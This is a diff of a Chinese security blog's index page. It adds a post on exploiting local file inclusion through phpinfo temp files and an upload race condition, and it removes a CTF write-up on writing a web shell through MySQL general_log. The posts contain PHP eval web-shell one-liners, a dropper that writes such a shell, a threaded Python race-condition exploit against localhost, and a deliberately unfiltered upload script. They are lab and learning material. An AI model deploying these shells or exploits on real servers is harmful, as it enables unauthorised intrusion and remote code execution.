@@ -90,6 +90,134 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/08/07/LFI with phpinfo测试/"> 
+                    LFI with phpinfo测试 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-07   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本地文件包含，英文Local File Include，简称LFI。文件包含是一种简化代码、提高代码重用率的方法。但是，由于没有正确处理用户输入，导致本地文件包含漏洞。黑客可以通过漏洞包含非PHP执行文件，如构造包含PHP代码的图片木马、临时文件、session文件、日志等来达到执行PHP代码的目的。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>一个简单的文件上传，无任何过滤的页面：</p>
+<p>Lfi.php:</p>
+<pre><code>&lt;?php include $_GET[&#39;file&#39;];</code></pre><p>&amp;一个phpinfo页面<br>docker复现的环境，这里吐槽一下ubantu..</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="php引擎对表单的处理"><a href="#php引擎对表单的处理" class="headerlink" title="php引擎对表单的处理"></a>php引擎对表单的处理</h3><p>以上传文件的方式请求任意PHP文件，服务器都会创建临时文件来保存文件内容<br>PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：<br>1、请求到达；</p>
+<p>2、创建临时文件，并写入上传文件的内容；</p>
+<p>3、调用相应PHP脚本进行处理，如校验名称、大小等；</p>
+<p>4、删除临时文件。</p>
+<p>PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。对phpinfo.php发起请求，会在/tmp下生成一个临时文件。其中临时文件内容正是我们POST请求中文件内容，临时文件的名称是php+随机数字.tmp,正中本地文件包含痛点。<br><img src="https://images2015.cnblogs.com/blog/804631/201511/804631-20151116135057405-833349425.jpg" alt></p>
+<h3 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h3><p>php默认的输出缓冲区大小为4096，也就是四字节，可以理解为php每次返回4096个字节给socket连接</p>
+<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>画了一个流程图，利用<strong>发送给phpinfo数据包</strong>和<strong>发送给包含点的数据包</strong>之间的时间差，来写入一个永久的文件，具体在流程图体现<br><img src="https://s1.ax1x.com/2018/08/06/PrdNHx.png" alt></p>
+<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>执行exp</p>
+<p>懒得贴图了，看链接吧<br><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">PHP文件包含漏洞（利用phpinfo）</a></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>在实际情况中，如果要修改poc参数，参考链接<br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">LFI with PHPInfo本地测试过程</a></p>
+<h2 id="文件上传竞争"><a href="#文件上传竞争" class="headerlink" title="文件上传竞争"></a>文件上传竞争</h2><p>刚才的竞争是数据从socket client到service过程和POST数据到文件包含过程的竞争，借助了文件包含这个点来生成一个webshell，或者执行系统命令的参数。</p>
+<p>文件竞争是多线程与服务期间的竞争。首先将文件上传到服务器，然后检测文件后缀名（或者是有害文件），如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<pre><code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>import os
+import requests
+import threading
+
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot;
+        self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot;
+
+    def _get(self):
+        print(&#39;try to call uploaded file...&#39;)
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print(&quot;[*]create file info.php success&quot;)
+            os._exit(0)
+
+    def _upload(self):
+        print(&quot;upload file.....&quot;)
+        file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)}
+        requests.post(self.uploadUrl, files=file)
+
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == &quot;__main__&quot;:
+    threads = 20
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+
+    for i in range(threads):
+        t.join()</code></pre><h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;myfile&quot;/&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><pre><code>&lt;?php
+$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
+$size = 10000000;
+$path = &quot;./&quot;;
+
+$filename = $_FILES[&#39;myfile&#39;][&#39;name&#39;];
+
+if (is_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;])){
+    if (!move_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;],$path.$filename)){
+        die(&quot;error:can not move!&quot;);
+    }
+} else {
+    die(&quot;error:not an upload file！&quot;);
+}
+
+$newfile = $path.$filename;
+echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;
+
+if ($_FILES[&#39;myfile&#39;][&#39;error&#39;] &gt; 0){
+    unlink($newfile);
+    die(&quot;Upload file error: &quot;);
+}
+
+$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#39;myfile&#39;][&#39;name&#39;]));
+if (!in_array($ext,$allowtype)){
+    unlink($newfile);
+    die(&quot;error:upload the file type is not allowed，delete the file！&quot;);
+}
+?&gt;</code></pre><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>很遗憾，文件上传竞争我没跑出来。最新学一下socket写个py吧，脚本转化能力太菜了</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/08/07/LFI with phpinfo测试/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/08/06/xss从零开始（三）之怒刷google-xss/"> 
                     xss从零开始（三）之怒刷google-xss 
                 </a>
@@ -875,53 +1003,6 @@ shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.c
             </div>
             <div class="continue">
             <a href="/2018/06/21/Nc反弹Shell初识/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/06/20/一道SCTF写日志getshell/"> 
-                    记SCTF的一道mysql日志写Shell题目 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-06-20   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>太尼玛菜了，感谢LinE师傅耐心点拨。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题是phpmyadmin弱口令登入，账号密码root<br>进去之后应该是写shell，但是show variables 发现file_priv为null，这说明Into outfile写shell显然是不可能了。</p>
-<ol>
-<li>百度到一种绕过file_priv写shell的方法： <a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">phpmyadmin通过日志文件拿到webshell</a></li>
-<li>接下来我们要找路径，我们可以通过找Log变量猜测绝对路径：<br><img src="https://s1.ax1x.com/2018/06/20/CzxNJH.png" alt="tupian"></li>
-<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<pre><code>&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</code></pre></li>
-</ol>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>set global general_log=’on’;<br>set global general_log_file=’G:/apm/apache2/htdocs/config.php’;</p>
-<p>这个log的路径自己发挥，想办法找可写路径。可以看一下log变量原来有没有路径</p>
-<p>select “<?php @eval($_POST['hpdoger']); ?>“;<br>set global general_log=off;</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我真的好菜啊…</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/06/20/一道SCTF写日志getshell/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
